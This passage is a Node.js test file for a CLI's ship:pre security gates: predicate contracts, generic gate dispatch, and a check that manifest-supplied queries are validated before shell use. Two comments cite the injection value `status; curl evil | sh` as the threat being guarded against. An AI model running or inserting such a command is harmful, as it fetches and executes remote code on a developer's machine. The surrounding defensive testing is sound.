'use strict';

/**
 * loop-hooks-ship-pre-e2e.test.cjs — E2E content tests for the ship:pre hook point.
 *
 * ADR-857 phase 6 gap coverage. Tests cover:
 *   - loop render-hooks ship:pre CLI subprocess (envelope shape, predicate typing)
 *   - frontmatter get CLI subprocess (threats_open field contract)
 *   - resolveLoopHooks pure-function with realRegistry (predicate.equals integer contract)
 *
 * NOTE (updated #3559): ship:pre now HAS a runnable evaluator. #2008/ADR-2008 shipped
 * evaluatePredicate behind `gsd_run check predicate`, and #3559 wired ship.md's preflight
 * onto it with a generic kind=="gate" dispatch loop, so a third-party capability's gate is
 * evaluated instead of resolved-then-dropped. The check.predicate shape is still asserted
 * here to pin the Hyrum's-law contract for downstream consumers. The former "prose only /
 * known robustness gap (kerckhoffs)" note described the pre-#2008 state and is retired —
 * section 5 below covers the dispatch contract and the evaluator it drives.
 *
 * Follows RULESET.TESTS (no source-grep, BVA at thresholds, genuine assertions).
 */

const { describe, test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');

const { cleanup, installSpawnEnv } = require('./helpers.cjs');

const GSD_TOOLS = path.join(__dirname, '..', 'gsd-core', 'bin', 'gsd-tools.cjs');

const {
  resolveLoopHooks,
} = require('../gsd-core/bin/lib/loop-resolver.cjs');

const realRegistry = require('../gsd-core/bin/lib/capability-registry.cjs');

// ─── Helpers ──────────────────────────────────────────────────────────────────

/**
 * Run gsd-tools synchronously via spawnSync. Returns { status, stdout, stderr }.
 * Does NOT throw on non-zero exit — callers must assert status themselves.
 *
 * #4291: uses helpers.cjs's installSpawnEnv() rather than a hand-rolled env,
 * because it sandboxes HOME (so capability-loader's overlayRoots, which
 * falls back to os.homedir(), never reaches the real machine) AND clears
 * the full config-location env list, not just three session-identity keys.
 * Without it, a capability genuinely installed on the host running the
 * suite (e.g. beads, markdown-linting) leaked into the ship:pre registry
 * and inflated the exact-count assertions below. opts.env is spread last so
 * the two deliberate overlay-fixture call sites below (GSD_HOME: fixture.home)
 * still opt in to a specific third-party capability root.
 */
function runTools(args, opts = {}) {
  const result = spawnSync(process.execPath, [GSD_TOOLS, ...args], {
    encoding: 'utf8',
    timeout: 60000,
    cwd: opts.cwd || process.cwd(),
    env: installSpawnEnv(opts.env),
  });
  return result;
}

/**
 * Create a minimal temp project directory with a .planning/ dir.
 * Optionally write config.json if configObj is provided.
 */
function makeTmpProject(prefix, configObj) {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  const planningDir = path.join(tmpDir, '.planning');
  fs.mkdirSync(planningDir, { recursive: true });
  if (configObj !== undefined) {
    fs.writeFileSync(path.join(planningDir, 'config.json'), JSON.stringify(configObj), 'utf8');
  }
  return tmpDir;
}

/**
 * Write a SECURITY.md file with the given frontmatter content to the given dir.
 */
function writeSecurityMd(dir, frontmatter) {
  const content = `---\n${frontmatter}\n---\n# Security Review\n`;
  const filePath = path.join(dir, 'SECURITY.md');
  fs.writeFileSync(filePath, content, 'utf8');
  return filePath;
}

// ─── Fixture state ─────────────────────────────────────────────────────────────

let tmpEnforcementOn;    // .planning/config.json with security_enforcement:true
let tmpEnforcementOff;   // .planning/config.json with security_enforcement:false
let tmpNoConfig;         // .planning/ dir with NO config.json (schema default applies)
let tmpWithSecurityMd;   // project + SECURITY.md variants in sub-temp dir

before(() => {
  tmpEnforcementOn = makeTmpProject('ship-pre-on-', { workflow: { security_enforcement: true } });
  tmpEnforcementOff = makeTmpProject('ship-pre-off-', { workflow: { security_enforcement: false } });
  tmpNoConfig = makeTmpProject('ship-pre-noconf-');  // no config.json
  tmpWithSecurityMd = fs.mkdtempSync(path.join(os.tmpdir(), 'ship-pre-secmd-'));
});

after(() => {
  if (tmpEnforcementOn) cleanup(tmpEnforcementOn);
  if (tmpEnforcementOff) cleanup(tmpEnforcementOff);
  if (tmpNoConfig) cleanup(tmpNoConfig);
  if (tmpWithSecurityMd) cleanup(tmpWithSecurityMd);
});

// ─── 1. render-hooks ship:pre envelope tests ──────────────────────────────────

describe('loop render-hooks ship:pre — envelope resolution', () => {

  test('[happy] security_enforcement=true returns gate hook with correct predicate shape', () => {
    const result = runTools(['loop', 'render-hooks', 'ship:pre', '--raw'], { cwd: tmpEnforcementOn });

    assert.strictEqual(result.status, 0, `expected exit 0, got ${result.status}; stderr: ${result.stderr}`);

    const envelope = JSON.parse(result.stdout.trim());

    assert.strictEqual(envelope.point, 'ship:pre');
    assert.strictEqual(envelope.activeHooks.length, 1, 'expected exactly 1 active hook');

    const gate = envelope.activeHooks[0];
    assert.strictEqual(gate.capId, 'security');
    assert.strictEqual(gate.kind, 'gate');
    assert.strictEqual(gate.blocking, true);
    assert.strictEqual(gate.onError, 'halt');
    assert.strictEqual(gate.when, 'workflow.security_enforcement');

    // Predicate shape — the critical contract for downstream workflow prose
    const pred = gate.check.predicate;
    assert.strictEqual(pred.kind, 'artifact-frontmatter-equals');
    assert.strictEqual(pred.artifact, 'SECURITY.md');
    assert.strictEqual(pred.field, 'threats_open');
    assert.strictEqual(pred.equals, 0);
    // TYPE contract: equals must be integer (not string '0')
    assert.strictEqual(typeof pred.equals, 'number', 'predicate.equals must be a number, not a string');
  });

  test('[negative] security_enforcement=false returns empty activeHooks (gate suppressed)', () => {
    const result = runTools(['loop', 'render-hooks', 'ship:pre', '--raw'], { cwd: tmpEnforcementOff });

    assert.strictEqual(result.status, 0);

    const envelope = JSON.parse(result.stdout.trim());

    assert.strictEqual(envelope.point, 'ship:pre');
    assert.deepEqual(envelope.activeHooks, [], 'expected empty activeHooks when enforcement disabled');
    assert.strictEqual(envelope.rendered, '_No active hooks at ship:pre._');

    // Confirm no security hook leaked through
    const secHook = envelope.activeHooks.find(h => h.capId === 'security');
    assert.strictEqual(secHook, undefined, 'security gate must be absent when enforcement=false');
  });

  test('[happy] no config.json uses schema default (security_enforcement=true) and activates gate', () => {
    const result = runTools(['loop', 'render-hooks', 'ship:pre', '--raw'], { cwd: tmpNoConfig });

    assert.strictEqual(result.status, 0);

    const envelope = JSON.parse(result.stdout.trim());

    // Schema default for security_enforcement is true — gate must fire
    assert.strictEqual(envelope.activeHooks.length, 1, 'schema default must activate the security gate');
    assert.strictEqual(envelope.activeHooks[0].capId, 'security');
    assert.strictEqual(envelope.activeHooks[0].blocking, true);
  });

  test('[empty-resolution] gate active when no SECURITY.md exists: envelope confirms gate live (fail-closed)', () => {
    // The phase dir has NO SECURITY.md — the gate is still ACTIVE in the envelope
    // (activation is config-driven; file absence is a predicate evaluation concern
    // handled by ship.md prose, not the CLI resolver).
    const tmpPhaseNoSec = makeTmpProject('ship-pre-nosec-', { workflow: { security_enforcement: true } });
    try {
      const phaseDir = path.join(tmpPhaseNoSec, '.planning', 'phases', '01-feature');
      fs.mkdirSync(phaseDir, { recursive: true });
      // No SECURITY.md written anywhere

      const result = runTools(['loop', 'render-hooks', 'ship:pre', '--raw'], { cwd: tmpPhaseNoSec });
      assert.strictEqual(result.status, 0);

      const envelope = JSON.parse(result.stdout.trim());

      // Gate must still be active — no-file does not suppress the gate
      assert.strictEqual(envelope.activeHooks.length, 1, 'gate must remain active even without SECURITY.md on disk');
      assert.strictEqual(envelope.activeHooks[0].capId, 'security');
      assert.strictEqual(envelope.activeHooks[0].blocking, true);
      // Confirm no SECURITY.md in the phase dir (this is the "no-file" scenario)
      const hasSec = fs.readdirSync(phaseDir).some(f => f.endsWith('-SECURITY.md') || f === 'SECURITY.md');
      assert.strictEqual(hasSec, false, 'fixture must have no SECURITY.md for this test to be meaningful');
    } finally {
      cleanup(tmpPhaseNoSec);
    }
  });

});

// ─── 2. predicate.equals integer contract via resolveLoopHooks (pure function) ─

describe('resolveLoopHooks ship:pre — predicate.equals integer type contract', () => {

  test('[bva] predicate.equals is integer 0 in resolved output (Hyrum\'s-law type pin)', () => {
    const resolved = resolveLoopHooks({
      point: 'ship:pre',
      registry: realRegistry,
      config: { workflow: { security_enforcement: true } },
    });

    assert.strictEqual(resolved.activeHooks.length, 1);
    const gate = resolved.activeHooks[0];
    assert.strictEqual(gate.capId, 'security');

    const equals = gate.check.predicate.equals;
    assert.strictEqual(equals, 0, 'predicate.equals must be integer 0');
    assert.strictEqual(typeof equals, 'number', 'predicate.equals typeof must be number, not string');
  });

  test('[negative] security_enforcement=false via resolveLoopHooks returns 0 active hooks', () => {
    const resolved = resolveLoopHooks({
      point: 'ship:pre',
      registry: realRegistry,
      config: { workflow: { security_enforcement: false } },
    });

    assert.strictEqual(resolved.activeHooks.length, 0, 'enforcement=false must yield 0 hooks');
    assert.strictEqual(resolved.point, 'ship:pre');
  });

});

// ─── 3. frontmatter get contract for threats_open field ───────────────────────

describe('frontmatter get SECURITY.md threats_open — type contract', () => {

  test('[happy] threats_open:0 returns string "0" (type contract: YAML→string via frontmatter CLI)', () => {
    const secFile = writeSecurityMd(tmpWithSecurityMd, 'threats_open: 0\nasvs_level: 1');

    const result = runTools(['frontmatter', 'get', secFile, '--field', 'threats_open', '--raw']);

    assert.strictEqual(result.status, 0);
    // Raw output is JSON-encoded string "0", not integer 0
    const parsed = JSON.parse(result.stdout.trim());
    assert.strictEqual(parsed, '0', 'frontmatter returns string "0", not integer 0');
    assert.strictEqual(typeof parsed, 'string', 'frontmatter CLI must return a string for YAML integer fields');
  });

  test('[bva] threats_open:1 returns string "1" — above threshold, predicate(equals:0) fails', () => {
    // BVA: equals:0 passes, equals:1 blocks — this is the just-above threshold value
    const secFile = path.join(tmpWithSecurityMd, 'SECURITY-1.md');
    fs.writeFileSync(secFile, '---\nthreats_open: 1\nasvs_level: 1\n---\n# Security\n', 'utf8');

    const result = runTools(['frontmatter', 'get', secFile, '--field', 'threats_open', '--raw']);

    assert.strictEqual(result.status, 0);
    const parsed = JSON.parse(result.stdout.trim());
    assert.strictEqual(parsed, '1', 'threats_open:1 must return string "1"');
    // Verify this differs from the passing case (string "0" !== string "1")
    assert.notStrictEqual(parsed, '0', 'string "1" must not equal passing value "0"');
  });

  test('[negative] missing threats_open field returns Field-not-found error (fail-closed path)', () => {
    const secFile = path.join(tmpWithSecurityMd, 'SECURITY-missing-field.md');
    // No threats_open key in frontmatter — only unrelated fields
    fs.writeFileSync(secFile, '---\nphase: 01\nstatus: active\n---\n# Security\n', 'utf8');

    const result = runTools(['frontmatter', 'get', secFile, '--field', 'threats_open', '--raw']);

    // Exit 0 — the CLI returns a JSON error object, not a crash
    assert.strictEqual(result.status, 0);
    const parsed = JSON.parse(result.stdout.trim());

    // Must return an error object, not a string value
    assert.strictEqual(typeof parsed, 'object', 'missing field must return an object, not a string');
    assert.strictEqual(parsed.error, 'Field not found');
    assert.strictEqual(parsed.field, 'threats_open');
  });

  test('[negative] threats_open: unknown returns string "unknown" (ambiguous value must fail closed)', () => {
    // Non-numeric string value — predicate (equals:0 integer) cannot match
    const secFile = path.join(tmpWithSecurityMd, 'SECURITY-unknown.md');
    fs.writeFileSync(secFile, '---\nthreats_open: unknown\nasvs_level: 1\n---\n# Security\n', 'utf8');

    const result = runTools(['frontmatter', 'get', secFile, '--field', 'threats_open', '--raw']);

    assert.strictEqual(result.status, 0);
    const parsed = JSON.parse(result.stdout.trim());

    assert.strictEqual(parsed, 'unknown', 'non-numeric value must be returned as-is');
    // Confirm this is NOT a match for predicate.equals===0 (integer)
    assert.notStrictEqual(parsed, 0, 'string "unknown" must not match integer 0');
    assert.strictEqual(typeof parsed, 'string');
  });

});

// ─── 4. Real registry structure sanity ────────────────────────────────────────

describe('real registry ship:pre — structural guards', () => {

  test('ship:pre byLoopPoint entry has only gates (no steps/contributions) and includes security + broken-windows', () => {
    const entry = realRegistry.byLoopPoint['ship:pre'];
    assert.ok(entry, 'ship:pre must exist in byLoopPoint');
    assert.strictEqual(entry.steps.length, 0, 'ship:pre must have 0 steps');
    assert.strictEqual(entry.contributions.length, 0, 'ship:pre must have 0 contributions');
    // Two predicate-style gates as of #1950: security (workflow.security_enforcement)
    // and broken-windows (workflow.windows_enforce). Both default-off in tests via
    // their respective when keys; both surface in the registry regardless of activation.
    assert.strictEqual(entry.gates.length, 2, 'ship:pre must have exactly 2 gates (security + broken-windows)');
    const capIds = entry.gates.map(g => g.capId).sort();
    assert.deepEqual(capIds, ['broken-windows', 'security'], 'ship:pre gate capIds must be {security, broken-windows}');
  });

  test('every ship:pre gate uses predicate (not query) and the security gate is present', () => {
    const gates = realRegistry.byLoopPoint['ship:pre'].gates;
    for (const gate of gates) {
      assert.ok(gate.check.predicate, `ship:pre gate ${gate.capId} must use predicate, not query`);
      assert.strictEqual(gate.check.query, undefined, `ship:pre gate ${gate.capId} must NOT have a check.query (predicate-only gate)`);
    }
    const security = gates.find(g => g.capId === 'security');
    assert.ok(security, 'ship:pre must include the security gate');
  });

});

// ─── 5. ship:pre gate dispatch is generic, not a capId allowlist (#3559) ───────
//
// #3559: ship.md's preflight resolved every active ship:pre gate and then enforced
// exactly two hardcoded capability IDs. A third-party capability's blocking gate was
// resolved, evaluable, and silently dropped — the ship proceeded past a failing gate
// with no evaluation and no warning.
//
// Two engines below, because the defect spans two surfaces:
//   5a. The DEPLOYED DISPATCH CONTRACT — ship.md's prose IS what the agent runtime
//       loads and executes, so its text is the deployed behavior. This is the
//       `source-text-is-the-product` exemption category, the sanctioned one for
//       workflow markdown (CONTRIBUTING → "Exception: allow-test-rule").
//   5b. The GENERIC EVALUATOR the contract now drives — ordinary behavioral
//       subprocess tests. This machinery shipped in #2008/ADR-2008 and was never
//       wired at ship:pre; these rows pin the contract the prose depends on.

const SHIP_MD = path.join(__dirname, '..', 'gsd-core', 'workflows', 'ship.md');

// The repo's shared generic-gate-dispatch phrasing, used verbatim at execute:wave:post
// (execute-phase.md), execute:post (execute-phase.md) and plan:post (plan-phase.md).
// Matching the shared phrase — rather than an arbitrary literal — is what makes this a
// contract assertion: ship:pre either speaks the same dispatch language as its siblings
// or it is hand-rolling, which is precisely what references/loop-hook-dispatch.md forbids.
const GENERIC_GATE_LOOP = /For each active entry where\s+`kind == "gate"`/;

/**
 * Extract ship.md's <step name="preflight_checks"> region.
 *
 * Scoped deliberately: ship:post dispatch lives in a different step in the same file
 * and is explicitly out of scope for #3559, so no assertion here may see it.
 */
function preflightRegion() {
  // allow-test-rule: source-text-is-the-product (#3559)
  // gsd-core/workflows/ship.md is shipped content executed by the agent runtime — its
  // text is the deployed gate-dispatch contract, not an implementation detail behind it.
  const src = fs.readFileSync(SHIP_MD, 'utf8');
  const open = src.indexOf('<step name="preflight_checks">');
  assert.notStrictEqual(open, -1, 'ship.md must contain a preflight_checks step');
  const close = src.indexOf('</step>', open);
  assert.notStrictEqual(close, -1, 'preflight_checks step must be closed');
  return src.slice(open, close);
}

describe('ship:pre gate dispatch contract (#3559)', () => {

  test('[regression] ship:pre preflight dispatches every active gate generically, not a capId allowlist', () => {
    const region = preflightRegion();

    assert.match(
      region,
      GENERIC_GATE_LOOP,
      'ship.md preflight must iterate EVERY active kind=="gate" entry using the same generic ' +
      'dispatch phrasing as execute:wave:post / execute:post / plan:post. Without it, a gate is ' +
      'enforced only when its capId happens to be named in this file, which is #3559.',
    );
  });

  test('[regression] capId arms are specializations inside the generic loop, never the sole gate selector', () => {
    const region = preflightRegion();

    const genericAt = region.search(GENERIC_GATE_LOOP);
    assert.notStrictEqual(genericAt, -1, 'generic gate loop must be present (see previous test)');

    const capIdSelectors = [...region.matchAll(/capId\s*==\s*"([a-z0-9-]+)"/g)];

    for (const match of capIdSelectors) {
      assert.ok(
        match.index > genericAt,
        `capId selector "${match[1]}" appears BEFORE the generic gate loop. A capId arm may only ` +
        'exist as a named specialization reached from inside the generic loop — a capId arm that ' +
        'runs first is a top-level allowlist, which drops every unlisted capability (#3559). ' +
        'Keeping every arm inside one loop is also what makes double-enforcement unrepresentable: ' +
        'each gate is visited exactly once.',
      );
    }
  });

  test('[regression] preflight cites the generic predicate evaluator and the two-step onError contract', () => {
    const region = preflightRegion();

    assert.match(
      region,
      /gsd_run check predicate --predicate/,
      'preflight must dispatch predicate gates through the generic evaluator CLI (ADR-2008/#2008), ' +
      'not re-implement each capability\'s predicate inline',
    );

    // Two-step contract: step 1 is "did the CHECK COMMAND fail" (routed per onError);
    // step 2 is "did the gate decide to block" (routed per blocking). Conflating them
    // would let onError:"skip" silently disarm a blocking gate's block decision.
    assert.match(region, /onError\s*==\s*"halt"/, 'preflight must handle onError=="halt" on command failure');
    assert.match(region, /onError\s*==\s*"skip"/, 'preflight must handle onError=="skip" on command failure');
    assert.match(region, /blocking\s*==\s*true/, 'preflight must branch on the gate\'s own blocking flag');
    assert.match(region, /blocking\s*==\s*false/, 'preflight must treat a non-blocking gate as advisory, never a halt');
  });

  test('[regression] a catch-all arm handles every capId the named branches do not, and comes last', () => {
    const region = preflightRegion();

    // Adversarial-review finding: asserting only that the shared loop phrase and the
    // evaluator substrings CO-OCCUR somewhere in the region is too weak. A partial
    // regression that keeps the loop phrase but deletes the default arm — leaving prose
    // that merely name-drops `gsd_run check predicate` and the onError/blocking words —
    // would satisfy those assertions while silently reintroducing #3559. The load-bearing
    // structure is a distinguishable DEFAULT branch, positioned after every named one.
    const catchAll = region.search(/\*\*Every other `capId`\*\*/);
    assert.notStrictEqual(
      catchAll,
      -1,
      'preflight must carry an explicit catch-all arm for every capId the named branches do not ' +
      'handle. Without it, dispatch is still an allowlist no matter how the loop is worded (#3559).',
    );

    const capIdSelectors = [...region.matchAll(/capId\s*==\s*"([a-z0-9-]+)"/g)];
    for (const match of capIdSelectors) {
      assert.ok(
        catchAll > match.index,
        `the catch-all arm must come AFTER the named "${match[1]}" branch — a default placed ` +
        'before a specialization would swallow it, changing that gate\'s established semantics.',
      );
    }

    // The catch-all is the arm that must reach the generic evaluator; a default branch that
    // does not evaluate anything is the bug wearing a different shape.
    const evaluatorAt = region.search(/gsd_run check predicate --predicate/);
    assert.ok(
      evaluatorAt > catchAll,
      'the generic predicate evaluator must be invoked from inside the catch-all arm, not merely ' +
      'mentioned somewhere earlier in the step',
    );
  });

  test('[security] the third-party check arm mandates validation before any shell use', () => {
    const region = preflightRegion();

    // #3559 made ship:pre reach THIRD-PARTY manifest strings for the first time — dispatch
    // previously never left the two first-party arms. `gates[].check` is not one of the four
    // executable surfaces the install consent prompt discloses (hooks, command modules,
    // mcpServers, reviewer lanes), so a capability can be consented to as declarative-only
    // and still reach a shell here. If this mandate is ever dropped, a manifest `check.query`
    // of `status; curl evil | sh` is interpolated straight into a command substitution.
    //
    // The RULE itself (charset, in-context, single-argv) lives once in the reference and is
    // asserted in section 6 — restating it at all five dispatch sites would recreate exactly
    // the doc-vs-implementation drift this PR had to repair.
    assert.match(
      region,
      /Validate `check` before shell use/,
      'the preflight must tell an executing agent to validate a manifest-supplied check before ' +
      'it reaches a shell',
    );
    assert.match(
      region,
      /loop-hook-dispatch\.md/,
      'the mandate must point at the reference carrying the rule, so it is actionable',
    );
    assert.match(
      region,
      /single argv element/,
      'the predicate arm must be passed as one argument, never re-quoted into a shell string',
    );
  });

  test('every capId named in ship:pre preflight declares a ship:pre gate in the registry', () => {
    const region = preflightRegion();

    const named = new Set([...region.matchAll(/capId\s*==\s*"([a-z0-9-]+)"/g)].map(m => m[1]));
    const declared = new Set(realRegistry.byLoopPoint['ship:pre'].gates.map(g => g.capId));

    for (const capId of named) {
      assert.ok(
        declared.has(capId),
        `ship.md preflight names capId "${capId}" but no ship:pre gate declares it. Either the ` +
        'capability was renamed/removed and the workflow arm is now dead, or the arm is a typo — ' +
        'both mean that gate is silently unenforced.',
      );
    }
  });

});

// ─── 5b. Generic evaluator contract the ship:pre dispatch now drives (#3559) ──

/**
 * Build a temp GSD_HOME carrying a third-party overlay capability that declares one
 * blocking ship:pre gate, plus a temp project with a phase artifact to evaluate against.
 *
 * GLOBAL scope (under GSD_HOME) is trusted without a consent record (ADR-1244 / #1459);
 * PROJECT scope would require a consent-store entry, which is a different concern.
 */
function makeOverlayFixture(blockingOpenLine) {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'ship-pre-3559-home-'));
  const capDir = path.join(home, '.gsd', 'capabilities', 'beads');
  fs.mkdirSync(capDir, { recursive: true });
  fs.writeFileSync(path.join(capDir, 'capability.json'), JSON.stringify({
    id: 'beads',
    title: 'Beads',
    version: '1.0.0',
    role: 'feature',
    tier: 'full',
    description: 'Third-party capability declaring a blocking ship:pre gate (#3559 fixture).',
    engines: { gsd: '>=1.7.0' },
    requires: [],
    runtimeCompat: { supported: ['claude'], unsupported: [] },
    skills: [],
    agents: [],
    config: {},
    steps: [],
    contributions: [],
    gates: [{
      point: 'ship:pre',
      check: {
        predicate: {
          kind: 'artifact-frontmatter-equals',
          artifact: 'BEADS.md',
          field: 'blocking_open',
          equals: 0,
        },
      },
      blocking: true,
      onError: 'skip',
    }],
  }), 'utf8');

  const project = makeTmpProject('ship-pre-3559-proj-');
  const phaseDir = path.join(project, '.planning', 'phases', '01-demo');
  fs.mkdirSync(phaseDir, { recursive: true });
  const frontmatter = blockingOpenLine === null ? 'diverged: 0' : `blocking_open: ${blockingOpenLine}\ndiverged: 0`;
  fs.writeFileSync(path.join(phaseDir, '01-BEADS.md'), `---\n${frontmatter}\n---\n# Beads\n`, 'utf8');

  return { home, project, phaseDir: path.join('.planning', 'phases', '01-demo') };
}

const BEADS_PREDICATE = JSON.stringify({
  kind: 'artifact-frontmatter-equals',
  artifact: 'BEADS.md',
  field: 'blocking_open',
  equals: 0,
});

function runCheckPredicate(fixture, predicateJson) {
  return runTools(
    ['check', 'predicate', '--predicate', predicateJson || BEADS_PREDICATE, '--phase-dir', fixture.phaseDir, '--raw'],
    { cwd: fixture.project, env: { GSD_HOME: fixture.home } },
  );
}

describe('ship:pre generic gate evaluation — third-party overlay gate (#3559)', () => {

  test('[happy] third-party artifact-frontmatter-equals gate blocks when the field diverges', (t) => {
    const fx = makeOverlayFixture(5);
    t.after(() => { cleanup(fx.home); cleanup(fx.project); });

    const result = runCheckPredicate(fx);
    assert.strictEqual(result.status, 0, `check predicate must exit 0 on a decisive verdict; stderr: ${result.stderr}`);

    const verdict = JSON.parse(result.stdout.trim());
    assert.strictEqual(verdict.block, true, 'blocking_open:5 against equals:0 must block');
    assert.strictEqual(verdict.details.match, false);
    assert.strictEqual(verdict.details.actual, '5');
    assert.strictEqual(verdict.details.expected, 0);
    assert.strictEqual(verdict.details.kind, 'artifact-frontmatter-equals');
  });

  test('[bva:limit] third-party gate passes at exactly the equals value', (t) => {
    const fx = makeOverlayFixture(0);
    t.after(() => { cleanup(fx.home); cleanup(fx.project); });

    const verdict = JSON.parse(runCheckPredicate(fx).stdout.trim());
    assert.strictEqual(verdict.block, false, 'blocking_open:0 against equals:0 must pass');
    assert.strictEqual(verdict.details.match, true);
  });

  test('[bva:limit+1] third-party gate blocks one past the equals value', (t) => {
    const fx = makeOverlayFixture(1);
    t.after(() => { cleanup(fx.home); cleanup(fx.project); });

    const verdict = JSON.parse(runCheckPredicate(fx).stdout.trim());
    assert.strictEqual(verdict.block, true, 'blocking_open:1 must block');
    assert.strictEqual(verdict.details.actual, '1');
  });

  test('[bva:limit-1] third-party gate blocks one below the equals value (strict equality, not <=)', (t) => {
    const fx = makeOverlayFixture(-1);
    t.after(() => { cleanup(fx.home); cleanup(fx.project); });

    const verdict = JSON.parse(runCheckPredicate(fx).stdout.trim());
    assert.strictEqual(verdict.block, true, 'blocking_open:-1 must block — the predicate is equality, not a ceiling');
    assert.strictEqual(verdict.details.actual, '-1');
  });

  test('[negative] absent frontmatter field fails closed', (t) => {
    const fx = makeOverlayFixture(null);   // artifact exists, blocking_open key absent
    t.after(() => { cleanup(fx.home); cleanup(fx.project); });

    const verdict = JSON.parse(runCheckPredicate(fx).stdout.trim());
    assert.strictEqual(verdict.block, true, 'an absent field is ambiguous and must never ship');
    assert.strictEqual(verdict.details.match, false);
  });

  test('[negative] malformed predicate exits non-zero so the workflow routes it per onError, not as a block', (t) => {
    const fx = makeOverlayFixture(5);
    t.after(() => { cleanup(fx.home); cleanup(fx.project); });

    const result = runCheckPredicate(fx, JSON.stringify({ kind: 'no-such-predicate-kind' }));

    // The evaluator THROWS on an unknown kind; the CLI seam maps that to a non-zero exit.
    // That is step 1 of the two-step gate contract — a command failure routed per onError —
    // and must never be readable as a block:false verdict (which would silently pass the gate).
    assert.notStrictEqual(result.status, 0, 'an unknown predicate kind must fail the check COMMAND');
  });

  test('[independence] overlay ship:pre gate resolves alongside first-party gates with its own blocking/onError', (t) => {
    const fx = makeOverlayFixture(5);
    t.after(() => { cleanup(fx.home); cleanup(fx.project); });

    const result = runTools(['loop', 'render-hooks', 'ship:pre', '--raw'],
      { cwd: fx.project, env: { GSD_HOME: fx.home } });
    assert.strictEqual(result.status, 0, `render-hooks must exit 0; stderr: ${result.stderr}`);

    const envelope = JSON.parse(result.stdout.trim());
    const gates = envelope.activeHooks.filter(h => h.kind === 'gate');

    const beads = gates.find(g => g.capId === 'beads');
    assert.ok(beads, 'the third-party overlay gate must resolve as an active ship:pre gate');
    assert.strictEqual(beads.blocking, true, 'overlay gate keeps its own blocking flag');
    assert.strictEqual(beads.onError, 'skip', 'overlay gate keeps its own onError policy');
    assert.strictEqual(beads.check.predicate.field, 'blocking_open');

    // More than one gate is active — dispatch has a genuine array to iterate, which is
    // exactly what the hardcoded-capId dispatch could not do.
    assert.ok(
      gates.length >= 2,
      `expected the overlay gate alongside at least one first-party gate, got ${gates.length}`,
    );
    assert.ok(
      gates.some(g => g.capId === 'security'),
      'the first-party security gate must still resolve when an overlay gate is present',
    );
  });

});

// ─── 6. Every generic gate-dispatch site validates before shell use (#3559) ───
//
// The command-injection surface fixed at ship:pre is a FAMILY property, not a site
// property: any workflow that interpolates a manifest-supplied `check.query` into a
// shell command has it. This section enumerates the family by DISCOVERY rather than by
// a hardcoded list, so a new dispatch site added later without the validation contract
// fails here instead of shipping — which is the same "hardcoded list silently misses
// members" mistake #3559 itself was.

const WORKFLOWS_DIR = path.join(__dirname, '..', 'gsd-core', 'workflows');

// A manifest-supplied query interpolated into a shell command substitution.
const SHELL_INTERPOLATED_QUERY = /gsd_run check \$\{hook\.check\.query\}/;
// The charset a query must be validated against before it may be run. Stated ONCE, in the
// reference — restating it at five sites would be the drift this PR just repaired.
const VALIDATION_CHARSET = /\^\[a-z\]\[a-z0-9-\]\*\( \[a-z\]\[a-z0-9-\]\*\)\*\$/;
// The per-site mandate: every dispatch site must tell an executing agent to validate BEFORE
// it reaches a shell, and where the rule lives.
const VALIDATE_MANDATE = /Validate `check` before shell use/;

function workflowFilesWithShellInterpolatedQuery() {
  // allow-test-rule: source-text-is-the-product (#3559)
  // gsd-core/workflows/*.md are shipped content executed by the agent runtime — the text
  // IS the deployed dispatch contract, so the validation instruction only exists here.
  return fs.readdirSync(WORKFLOWS_DIR)
    .filter(name => name.endsWith('.md'))
    .map(name => ({ name, body: fs.readFileSync(path.join(WORKFLOWS_DIR, name), 'utf8') }))
    .filter(f => SHELL_INTERPOLATED_QUERY.test(f.body));
}

describe('capability gate dispatch — manifest input is validated before shell use (#3559)', () => {

  test('the discovery scan finds the known dispatch family (guards against a vacuous pass)', () => {
    const found = workflowFilesWithShellInterpolatedQuery().map(f => f.name).sort();

    // If the interpolation form is ever renamed, the scan below would silently match
    // nothing and every assertion in this section would pass vacuously. Pin the floor.
    assert.ok(
      found.length >= 4,
      `expected at least 4 workflows interpolating a manifest query into a shell command, found ` +
      `${found.length} (${found.join(', ')}). A near-zero count means SHELL_INTERPOLATED_QUERY no ` +
      'longer matches the deployed form and this whole section is passing vacuously.',
    );
    for (const expected of ['execute-phase.md', 'plan-phase.md', 'ship.md', 'verify-work.md']) {
      assert.ok(found.includes(expected), `${expected} must be in the dispatch family, got ${found.join(', ')}`);
    }
  });

  for (const { name } of workflowFilesWithShellInterpolatedQuery()) {
    test(`${name} validates a manifest-supplied check.query before running it`, () => {
      const body = fs.readFileSync(path.join(WORKFLOWS_DIR, name), 'utf8');

      // `gates[].check` is not one of the four executable surfaces the install consent
      // prompt discloses, so a capability consented to as declarative-only can still reach
      // a shell through it. A query of `status; curl evil | sh` interpolated unquoted into
      // $( ) is arbitrary code execution as the developer.
      assert.match(
        body,
        VALIDATE_MANDATE,
        `${name} interpolates a manifest-supplied check.query into a shell command but never ` +
        'tells an executing agent to validate it first.',
      );
      assert.match(
        body,
        /loop-hook-dispatch\.md/,
        `${name} must point at the reference that carries the validation rule, so the mandate ` +
        'is actionable rather than a bare warning.',
      );
      assert.ok(
        body.search(VALIDATE_MANDATE) < body.search(SHELL_INTERPOLATED_QUERY),
        `${name} states the validation mandate only AFTER the interpolation it is supposed to ` +
        'guard; an executing agent reads top-down and would run the command first.',
      );
    });
  }

  test('the reference contract states the rule for gates, not only for steps', () => {
    // allow-test-rule: source-text-is-the-product (#3559)
    const ref = fs.readFileSync(
      path.join(__dirname, '..', 'gsd-core', 'references', 'loop-hook-dispatch.md'), 'utf8');

    const gateSection = ref.slice(ref.indexOf('### `gate`'));
    assert.notStrictEqual(gateSection.length, 0, 'the reference must carry a gate section');
    assert.match(
      gateSection,
      VALIDATION_CHARSET,
      'loop-hook-dispatch.md mandated in-context validation for `step` -> ref.command but omitted ' +
      'it for `gate`. That asymmetry is the root cause of #3559 and its four sibling sites: every ' +
      'gate consumer inherited an unstated requirement.',
    );
  });

  test('onError vocabulary matches what the registry and every manifest actually use', () => {
    // allow-test-rule: source-text-is-the-product (#3559)
    const ref = fs.readFileSync(
      path.join(__dirname, '..', 'gsd-core', 'references', 'loop-hook-dispatch.md'), 'utf8');

    // The reference documented skip/"fail"; the generated registry, every shipped manifest,
